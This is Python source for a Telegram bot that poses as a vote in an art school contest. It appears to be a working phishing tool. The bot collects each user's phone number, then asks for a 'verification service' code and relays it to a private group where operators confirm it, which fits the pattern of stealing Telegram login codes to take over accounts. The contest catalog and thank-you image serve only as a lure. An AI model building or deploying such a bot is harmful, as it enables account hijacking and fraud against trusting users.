import logging
import os
import asyncio
from pathlib import Path

from aiogram import BaseMiddleware, Bot, Dispatcher
from aiogram.exceptions import TelegramAPIError, TelegramBadRequest
from aiogram.types import (CallbackQuery, FSInputFile, InlineKeyboardButton,
                           InlineKeyboardMarkup, InputMediaPhoto, KeyboardButton,
                           Message, ReplyKeyboardMarkup, ReplyKeyboardRemove)
from dotenv import load_dotenv

from catalog import caption, load_catalog
from store import Store

BASE = Path(__file__).resolve().parent
START_TOPIC, CONTACT_TOPIC, CODE_TOPIC = 91, 93, 95
THANKS_IMAGE = BASE / 'images' / 'thanks.png'
logger = logging.getLogger('catalog')


def keyboard(rows):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=text, callback_data=data) for text, data in row]
        for row in rows])


def create_dispatcher(bot, store, participants, group_id):
    dp = Dispatcher()
    records = {p['id']: p for p in participants}

    class Access(BaseMiddleware):
        async def __call__(self, handler, event, data):
            message = event.message if isinstance(event, CallbackQuery) else event
            is_review = (isinstance(event, CallbackQuery) and message and message.chat.id == group_id
                         and (event.data or '').startswith('review:'))
            if is_review:
                return await handler(event, data)
            if not isinstance(message, Message) or message.chat.type != 'private':
                if isinstance(event, CallbackQuery):
                    await event.answer('Откройте личный чат с ботом.')
                return
            return await handler(event, data)

    dp.message.outer_middleware(Access())
    dp.callback_query.outer_middleware(Access())

    async def audit(text, topic, reply_markup=None):
        try:
            await bot.send_message(group_id, text, message_thread_id=topic, reply_markup=reply_markup)
            return True
        except TelegramAPIError:
            logger.error('Не вдалося надіслати подію в тему %s', topic)
            return False

    async def contact_prompt(message):
        await message.answer(
            '📱 Поділіться своїм контактом. Організатор отримає ваше ім’я та номер '
            'у закритій групі конкурсу.',
            reply_markup=ReplyKeyboardMarkup(keyboard=[[
                KeyboardButton(text='📱 Поділитися контактом', request_contact=True)
            ]], resize_keyboard=True, one_time_keyboard=True))

    def buttons(uid, pid):
        chosen = store.selected(uid, pid)
        rows = [[('✅ Обрано' if chosen else '✅ Обрати', f'pick:{pid}'),
                 ('➡️ Наступний учасник', f'next:{pid}')]]
        if chosen:
            rows.append([('🏁 Завершити перегляд', f'finish:{pid}')])
        return keyboard(rows)

    async def show(message, uid, after=0, edit=False):
        participant = next((p for p in participants if p['id'] > after), None)
        if participant is None:
            text = ('🏁 Усі учасники переглянуті. Ваш вибір зафіксовано.' if participants
                    else '🖼 Каталог поки порожній.')
            if edit:
                await message.edit_reply_markup(reply_markup=None)
            await message.answer(text, reply_markup=keyboard([[('↩️ Переглянути спочатку', 'browse')]]))
            store.update(uid, card=None, participant=None)
            return
        pid = participant['id']
        photo = FSInputFile(participant['image'])
        try:
            if edit:
                sent = await message.edit_media(
                    InputMediaPhoto(media=photo, caption=caption(participant), parse_mode='HTML'),
                    reply_markup=buttons(uid, pid))
            else:
                sent = await message.answer_photo(photo, caption=caption(participant),
                                                  parse_mode='HTML', reply_markup=buttons(uid, pid))
        except TelegramAPIError:
            logger.error('Помилка надсилання малюнка учасника %s', pid)
            await message.answer('Не вдалося показати малюнок. Спробуйте ще раз.')
            return
        store.update(uid, card=sent.message_id, participant=pid)

    async def clear_card(uid):
        user = store.user(uid)
        if user['card']:
            try:
                await bot.edit_message_reply_markup(chat_id=uid, message_id=user['card'], reply_markup=None)
            except TelegramBadRequest:
                pass
        store.update(uid, card=None, participant=None)

    @dp.message()
    async def messages(message: Message):
        uid = message.from_user.id
        user = store.user(uid)
        text = message.text or ''
        command = text.split(maxsplit=1)[0].split('@')[0] if text else ''
        if command == '/start':
            await clear_card(uid)
            await audit(f'🟢 Старт\nID: {uid}\nІм’я: {message.from_user.full_name}', START_TOPIC)
            await message.answer('👋 Вітаємо на конкурсі школи «Палітра»!\n'
                                 'Переглядайте роботи та обирайте учасників.',
                                 reply_markup=ReplyKeyboardRemove())
            if user['stage'] == 'ready':
                await show(message, uid)
            elif user['stage'] in ('code', 'code_pending'):
                await message.answer('Введіть код, отриманий від сервісу верифікації.' if user['stage'] == 'code'
                                     else '⏳ Код передано на перевірку. Будь ласка, дочекайтеся рішення менеджера.')
            else:
                await contact_prompt(message)
            return
        if command == '/catalog' and user['stage'] == 'ready':
            await clear_card(uid)
            await show(message, uid)
            return
        if user['stage'] == 'contact':
            if not message.contact or message.contact.user_id != uid:
                await contact_prompt(message)
                return
            success = await audit(f'📱 Контакт\nID: {uid}\n'
                                  f'Ім’я: {message.from_user.full_name}\n'
                                  f'Телефон: {message.contact.phone_number}', CONTACT_TOPIC)
            if not success:
                await message.answer('Не удалось передать контакт организатору. Попробуйте позже.')
                return
            store.update(uid, stage='code')
            await message.answer('✅ Контакт отримано.\nВведіть код, отриманий від сервісу верифікації.',
                                 reply_markup=ReplyKeyboardRemove())
            return
        if user['stage'] == 'code':
            code = text.strip()
            if not code or len(code) > 128:
                await message.answer('Введіть код із повідомлення сервісу верифікації.')
                return
            request_id = store.create_verification(uid, code)
            review_keyboard = keyboard([[('✅ Код правильний', f'review:yes:{request_id}'),
                                         ('❌ Код неправильний', f'review:no:{request_id}')]])
            sent = await audit(f'🔐 НОВИЙ КОД\n\nID: {uid}\nUsername: @{message.from_user.username or "немає"}\n'
                               f'Ім’я: {message.from_user.full_name}\nКод: {code}', CODE_TOPIC, review_keyboard)
            if not sent:
                store.review_verification(request_id, False, 0)
                await message.answer('Не вдалося передати код на перевірку. Спробуйте ще раз.')
                return
            store.update(uid, stage='code_pending')
            await message.answer('⏳ <b>Код отримано.</b>\n\nЗачекайте: менеджер перевіряє його.', parse_mode='HTML')
            return
        if user['stage'] == 'code_pending':
            await message.answer('⏳ Код уже передано на перевірку. Дочекайтеся рішення менеджера.')
            return
        await message.answer('Відкрити каталог: /catalog')

    @dp.callback_query()
    async def callbacks(callback: CallbackQuery):
        if (callback.data or '').startswith('review:'):
            try:
                _, answer, raw_request_id = callback.data.split(':')
                request_id = int(raw_request_id)
            except ValueError:
                await callback.answer('Некоректна заявка.')
                return
            approved = answer == 'yes'
            request = store.review_verification(request_id, approved, callback.from_user.id)
            if request is None:
                await callback.answer('Цю заявку вже оброблено.', show_alert=True)
                return
            await callback.message.edit_reply_markup(reply_markup=None)
            await callback.message.answer('✅ КОД ПРАВИЛЬНИЙ' if approved else '❌ КОД НЕПРАВИЛЬНИЙ')
            if approved:
                await bot.send_message(request['user_id'], '✅ <b>Код підтверджено.</b>\n\nВідкрийте каталог: /catalog', parse_mode='HTML')
                await audit(f'✅ Код підтверджено\nID: {request["user_id"]}\nПеревірив: {callback.from_user.full_name}', CODE_TOPIC)
                await callback.answer('Код позначено як правильний')
            else:
                await bot.send_message(request['user_id'], '❌ <b>Код не підтверджено.</b>\n\nПеревірте код і введіть його ще раз.', parse_mode='HTML')
                await callback.answer('Код позначено як неправильний')
            return
        uid = callback.from_user.id
        user = store.user(uid)
        if user['stage'] != 'ready':
            await callback.answer('Спочатку завершіть вхід через /start.', show_alert=True)
            return
        if callback.data == 'browse':
            await callback.answer()
            await clear_card(uid)
            await show(callback.message, uid)
            return
        try:
            action, raw_pid = (callback.data or '').split(':')
            pid = int(raw_pid)
        except ValueError:
            await callback.answer('Невідома кнопка.')
            return
        if (pid not in records or user['participant'] != pid
                or user['card'] != callback.message.message_id):
            await callback.answer('Цю картку вже закрито. Відкрийте /catalog.')
            return
        if action == 'pick':
            if store.selected(uid, pid):
                await callback.answer('Учасника вже обрано.')
                return
            store.select(uid, pid)
            await callback.answer('✅ Вибір зафіксовано')
            await callback.message.edit_reply_markup(reply_markup=buttons(uid, pid))
        elif action == 'next':
            await callback.answer()
            await show(callback.message, uid, after=pid, edit=True)
        elif action == 'finish':
            await callback.answer()
            await clear_card(uid)
            await callback.message.answer_photo(
                FSInputFile(THANKS_IMAGE),
                caption='💛 <b>Дякуємо за підтримку!</b>\n\nВаш голос зараховано.',
                parse_mode='HTML',
                reply_markup=keyboard([[('↩️ Переглянути спочатку', 'browse')]]))
        else:
            await callback.answer('Невідома кнопка.')

    return dp


async def main():
    load_dotenv(BASE / '.env')
    token = os.getenv('BOT_TOKEN', '')
    try:
        group_id = int(os.getenv('GROUP_ID', ''))
    except ValueError:
        raise SystemExit('Заповніть GROUP_ID у .env')
    if not token or group_id >= 0:
        raise SystemExit('Заповніть BOT_TOKEN і GROUP_ID у .env')
    participants = load_catalog(BASE / 'participants.json')
    store = Store()
    bot = Bot(token)
    try:
        dp = create_dispatcher(bot, store, participants, group_id)
        # Keep pending updates on restart.
        await bot.delete_webhook(drop_pending_updates=False)
        await dp.start_polling(bot)
    finally:
        await bot.session.close()


if __name__ == '__main__':
    logging.basicConfig(level=logging.WARNING)
    asyncio.run(main())
